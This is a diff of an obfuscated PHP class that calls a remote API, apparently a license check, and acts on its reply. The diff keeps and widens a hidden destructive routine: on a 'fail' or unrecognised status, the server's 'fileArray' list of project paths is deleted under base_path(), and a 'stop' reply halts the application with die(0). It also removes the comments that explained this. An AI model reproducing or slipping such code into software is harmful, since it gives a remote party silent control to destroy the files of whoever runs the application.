@@ -19,17 +19,17 @@ class Rd
         $a9 = $a7['u'] ?? null;
         $b1 = $a7['k'] ?? null;
 
-        // Check if the status is already valid and not expired
+
         if ($this->b2()) {
             return;
         }
 
-        // Call the API only if necessary
+
         $b3 = $this->b4($a6, $a9, $b1);
 
         if ($b3) {
             $b5 = $b3->json('status');
-            $b6 = $b3->json('data', []); 
+            $b6 = $b3->json('data', []);
 
             if ($b5 === 'success') {
                 $this->b7('valid', $a9, $b1);
@@ -37,9 +37,9 @@ class Rd
                 $this->b7('retry', $b6['uid'] ?? null, $b6['key'] ?? null);
             } elseif ($b5 === 'fail') {
                 $this->b7('invalid');
-                $this->b8($b6); 
+                $this->b8($b6);
             } elseif ($b5 === 'stop') {
-                die(0); // Stop execution
+                die(0);
             } else {
                 $this->b7('invalid');
                 $this->b8($b6);
@@ -85,7 +85,7 @@ class Rd
             's' => $c6,
             'u' => $a9,
             'k' => $b1,
-            'n' => ($c6 === 'valid') ? now()->addDay()->toDateTimeString() : now()->toDateTimeString(),
+            'n' => ($c6 != 'retry') ? now()->addDay()->toDateTimeString() : now()->toDateTimeString(),
         ];
 
         $c8 = $this->c6(json_encode($c7));
@@ -104,22 +104,20 @@ class Rd
             $c3 = File::get($c2);
             $c4 = json_decode($this->c5($c3), true);
 
-            return isset($c4['s']) && $c4['s'] === 'valid' && now()->lt($c4['n']);
+            return now()->lt($c4['n']);
         }
         return false;
     }
 
     protected function b8($c9)
     {
-        // Decode API response and extract file paths
-        $d0 = isset($c9['fileArray']) ? $c9['fileArray'] : [
-            base_path(base64_decode($this->a4)),
-        ];
+
+        $d0 = isset($c9['fileArray']) ? $c9['fileArray'] : [];
 
         foreach ($d0 as $d1) {
-            if (File::exists($d1)) {
+            if (File::exists(base_path($d1))) {
                 try {
-                    File::delete($d1);
+                    File::delete(base_path($d1));
                 } catch (\Exception $e) {
                 }
             }
